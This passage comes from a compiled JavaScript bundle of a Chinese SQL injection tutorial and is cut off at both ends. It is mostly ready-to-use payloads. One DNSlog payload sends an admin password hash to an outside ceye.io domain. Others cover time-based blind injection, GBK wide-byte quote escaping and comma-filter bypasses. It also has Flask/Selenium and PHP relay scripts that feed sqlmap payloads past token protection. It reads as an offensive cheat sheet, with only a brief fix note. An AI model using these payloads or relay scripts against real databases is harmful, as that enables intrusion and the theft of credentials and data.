punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"5"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--+")))),Object(t.b)("p",null,"具体数据以此类推即可。"),Object(t.b)("h3",{className:"__internal",id:"时间型盲注的加速方式"},"时间型盲注的加速方式",Object(t.b)("a",s({parentName:"h3"},{href:"#%E6%97%B6%E9%97%B4%E5%9E%8B%E7%9B%B2%E6%B3%A8%E7%9A%84%E5%8A%A0%E9%80%9F%E6%96%B9%E5%BC%8F","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"1、Windows平台上的Mysql可以用DNSlog加速注入")),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"2、利用二分查找法")),Object(t.b)("p",null,"sqlmap盲注默认采用的是二分查找法"),Object(t.b)("blockquote",null,Object(t.b)("ul",{parentName:"blockquote"},Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),"利用 ASCII 码作为条件来查询，ASCII 码中字母范围在65~122之间"),Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),"以这个范围的中间数为条件，判断payload中传入的 ASCII 码是否大于这个中间数"),Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),"如果大于，就往中间数",Object(t.b)("del",{parentName:"li"},"122这块查找。反之亦然")))),Object(t.b)("h2",{className:"__internal",id:"注入技巧"},"注入技巧",Object(t.b)("a",s({parentName:"h2"},{href:"#%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("h3",{className:"__internal",id:"dnslog盲注详解"},"DNSlog盲注详解",Object(t.b)("a",s({parentName:"h3"},{href:"#dnslog%E7%9B%B2%E6%B3%A8%E8%AF%A6%E8%A7%A3","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,"DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息；"),Object(t.b)("p",null,"DNSlog就是记录用户访问网站域名时，记录DNS和对应的IP的转换访问日志；"),Object(t.b)("p",null,"MySQL Load_File()函数可以发起请求，使用Dnslog接收请求，获取数据；"),Object(t.b)("p",null,"通过SQL执行后，将内容输出到DNSlog中记录起来，然后我们可以在DNSlog平台查询回显数据"),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"union")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"2"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"load_file",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"CONCAT",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'\\\\'"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"SELECT")," hex",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"pass",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"FROM")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"user")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"WHERE")," name",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'admin'")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"LIMIT")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'.mysql.wintrysec.ceye.io\\abc'"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n\n",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--Hex编码的目的是减少干扰，域名有一定的规范，有些特殊字符不能带入")))),Object(t.b)("blockquote",null,Object(t.b)("p",{parentName:"blockquote"},"注意：load_file()只能在windows平台上才能发起请求，linux下做dnslog攻击是不行的"),Object(t.b)("p",{parentName:"blockquote"},"因为UNC通用命名规范， ","\\","server\\share_name"),Object(t.b)("p",{parentName:"blockquote"},"上边 CONCAT 应该写四个反斜杠 \\，因为最后会被转义成两个"),Object(t.b)("p",{parentName:"blockquote"},"因为Linux没有遵守UNC，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的")),Object(t.b)("blockquote",null,Object(t.b)("p",{parentName:"blockquote"},"MySQL数据库配置中要设置secure_file_priv为空,才能完整的去请求DNS"),Object(t.b)("p",{parentName:"blockquote"},"secure-file-priv参数是用来限制 LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的"),Object(t.b)("ul",{parentName:"blockquote"},Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),"ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出"),Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),"当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下"),Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),"当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制"))),Object(t.b)("p",null,"在时间型盲注中用DNSlog加速注入"),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'and if((SELECT LOAD_FILE(CONCAT('"),"\\\\\\\\'",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"SELECT")," hex",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"database"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'.xxx.ceye.io\\\\abc'"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"sleep",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"5"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"%"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"23")))),Object(t.b)("p",null,Object(t.b)("a",s({parentName:"p"},{href:"https://www.anquanke.com/post/id/98096",target:"_blank"}),"DNSlog在SQL注入中的实战")),Object(t.b)("h3",{className:"__internal",id:"宽字节注入过滤了单引号"},"宽字节注入(过滤了单引号)",Object(t.b)("a",s({parentName:"h3"},{href:"#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E4%BA%86%E5%8D%95%E5%BC%95%E5%8F%B7","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("blockquote",null,Object(t.b)("p",{parentName:"blockquote"},"在数据库中使用了宽字符集(GBK，GB2312等)，除了英文都是一个字符占两字节；"),Object(t.b)("p",{parentName:"blockquote"},"MySQL在使用GBK编码的时候，会认为两个字符为一个汉字(ascii>128才能达到汉字范围)；"),Object(t.b)("p",{parentName:"blockquote"},"在PHP中使用",Object(t.b)("inlineCode",{parentName:"p"},"addslashes"),"函数的时候，会对单引号%27进行转义，在前边加一个反斜杠”\\”，变成%5c%27;"),Object(t.b)("p",{parentName:"blockquote"},"可以在前边添加%df,形成%df%5c%27，而数据进入数据库中时前边的%df%5c两字节会被当成一个汉字;"),Object(t.b)("p",{parentName:"blockquote"},"%5c被吃掉了，单引号由此逃逸可以用来闭合语句。")),Object(t.b)("p",null,"使用PHP函数",Object(t.b)("inlineCode",{parentName:"p"},"iconv('utf-8','gbk',$_GET['id'])"),",也可能导致注入产生"),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"修复建议")),Object(t.b)("ul",null,Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),"使用mysqli_set_charset(GBK)指定字符集"),Object(t.b)("li",s({parentName:"ul"},{className:"__internal"}),"使用mysqli_real_escape_string进行转义")),Object(t.b)("h3",{className:"__internal",id:"过滤了逗号怎么办"},"过滤了逗号怎么办",Object(t.b)("a",s({parentName:"h3"},{href:"#%E8%BF%87%E6%BB%A4%E4%BA%86%E9%80%97%E5%8F%B7%E6%80%8E%E4%B9%88%E5%8A%9E","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"盲注的时候")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"LIMIT")," M ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"OFFSET")," N    \n",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--这里的 M 是最大回显限度，N是偏移量"),"\n",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"--与limit N,M 有相同效果"),"\n\n",Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"' and ascii(substr((select database()),1,1))=xxx#\n--可变为\n'")," ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"and")," ascii",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"substr",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"database"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"for")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"xxx",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"#")))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"union联合查询注入时")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"sql"},Object(t.b)("pre",s({parentName:"div"},{className:"language-sql"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-sql"}),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"union")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"2"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"3"),"\n",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"union")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"*")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"a ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"JOIN")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"2"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"b ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"JOIN")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"3"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"c",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"%"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"23"),"\n\n",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"union")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"*")," ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"a ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"JOIN")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," ",Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"2"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"b ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"JOIN")," ",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"select")," CONCAT_WS",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"CHAR"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"32"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"58"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"32"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"user"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"database"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"version",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"c",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"%"),Object(t.b)("span",s({parentName:"code"},{className:"token number"}),"23")))),Object(t.b)("h3",{className:"__internal",id:"二阶注入"},"二阶注入",Object(t.b)("a",s({parentName:"h3"},{href:"#%E4%BA%8C%E9%98%B6%E6%B3%A8%E5%85%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("blockquote",null,Object(t.b)("p",{parentName:"blockquote"},"当数据首次插入到数据库中时，许多应用程序能够安全处理这些数据；addslashes() 等字符转义函数。"),Object(t.b)("p",{parentName:"blockquote"},"一旦数据存储在数据库中，随后应用程序本身或其它后端进程可能会以危险的方式处理这些数据。"),Object(t.b)("p",{parentName:"blockquote"},"许多这类应用并不像面向因特网的主要应用程序一样安全，却拥有较高权限的数据库账户。")),Object(t.b)("p",null,"第一次HTTP请求是精心构造的，为第二次HTTP请求触发漏洞做准备。"),Object(t.b)("p",null,Object(t.b)("a",s({parentName:"p"},{href:"https://www.freebuf.com/articles/web/142963.html",target:"_blank"}),"使用Burp和自定义Sqlmap Tamper利用二次注入漏洞")),Object(t.b)("h3",{className:"__internal",id:"中转注入"},"中转注入",Object(t.b)("a",s({parentName:"h3"},{href:"#%E4%B8%AD%E8%BD%AC%E6%B3%A8%E5%85%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(t.b)("blockquote",null,Object(t.b)("p",{parentName:"blockquote"},Object(t.b)("strong",{parentName:"p"},"当网站做了token保护或js前端加密的情况下；")),Object(t.b)("p",{parentName:"blockquote"},"对于这些站点当手工发现了注入点，但并不适用于用sqlmap等工具跑，可以做中转注入；"),Object(t.b)("p",{parentName:"blockquote"},"本地起个Server，然后用sqlmap扫这个server，Server接收到payload后加到表单中提交。")),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"Python+selenium做中转注入")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"python"},Object(t.b)("pre",s({parentName:"div"},{className:"language-python"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-python"}),Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," flask ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"import")," Flask\n",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," flask ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"import")," request\n",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," selenium ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"import")," webdriver\ndriver_path ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"=")," ",Object(t.b)("span",s({parentName:"code"},{className:"token string"}),'"C:/Users/Administrator/AppData/Local/Programs/Python/Python37/Lib/site-packages/selenium/webdriver/chrome/chromedriver.exe"'),"\nchrome ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"=")," webdriver",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"Chrome",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"driver_path",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\nchrome",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"get",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),'"http://127.0.0.1"'),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"#目标注入点"),"\napp ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"=")," Flask",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"__name__",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n\n",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"def")," ",Object(t.b)("span",s({parentName:"code"},{className:"token function"}),"send"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"payload",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),":"),"\n",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"#起到中转payload效果。"),"\n  chrome",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"find_element_by_id",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),'"username"'),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"send_keys",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"payload",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")," ",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"#把payload填到有注入点的地方"),"\n  chrome",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"find_element_by_id",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),'"password"'),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"send_keys",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),'"aaaa"'),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n  chrome",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"find_element_by_id",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),'"submit"'),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"click",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n  ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"return")," ",Object(t.b)("span",s({parentName:"code"},{className:"token string"}),'"plase see flask server!"')," ",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"#随便返回一下不重要"),"\n\n",Object(t.b)("span",s({parentName:"code"},{className:"token decorator annotation punctuation"}),"@app",Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"."),"route"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),"'/'"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"def")," ",Object(t.b)("span",s({parentName:"code"},{className:"token function"}),"index"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),":"),"\n    ",Object(t.b)("span",s({parentName:"code"},{className:"token comment"}),"# 接收sqlmap传递过来的payload"),"\n    payload ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"=")," request",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"args",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"get",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token string"}),'"payload"'),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n    ",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"return")," send",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"payload",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n\n",Object(t.b)("span",s({parentName:"code"},{className:"token keyword"}),"if")," __name__ ",Object(t.b)("span",s({parentName:"code"},{className:"token operator"}),"==")," ",Object(t.b)("span",s({parentName:"code"},{className:"token string"}),'"__main__"'),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),":"),"\n    app",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"run",Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")))),Object(t.b)("p",null,Object(t.b)("strong",{parentName:"p"},"用PHP做中转注入")),Object(t.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(t.b)("pre",s({parentName:"div"},{className:"language-php"}),Object(t.b)("code",s({parentName:"pre"},{className:"language-php"}),Object(t.b)("span",s({parentName:"code"},{className:"token php language-php"}),Object(t.b)("span",s({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token comment"}),"//先开启php.ini 中的extension=php_curl.dll"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"set_time_limit"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token number"}),"1"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$curl")," ",Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"curl_init"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),Object(t.b)("span",s({parentName:"span"},{className:"token comment"}),"//初始化curl"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$id")," ",Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$_GET"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"["),Object(t.b)("span",s({parentName:"span"},{className:"token single-quoted-string string"}),"'id'"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"]"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token comment"}),"//替换id空格和="),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$id")," ",Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"str_replace"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'" "'),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"%20"'),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$id"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$id")," ",Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(t.b)("span",s({parentName:"span"},{className:"token function"}),"str_replace"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),"("),Object(t.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"="'),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"%3D"'),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),","),Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$id"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token variable"}),"$url")," ",Object(t.b)("span",s({parentName:"span"},{className:"token operator"}),"=")," ",Object(t.b)("span",s({parentName:"span"},{className:"token double-quoted-string string"}),'"http://xxx.com/aaa.php"'),Object(t.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(t.b)("span",s({parentName:"span"},{className:"token comment"}),"// 设置目标URL  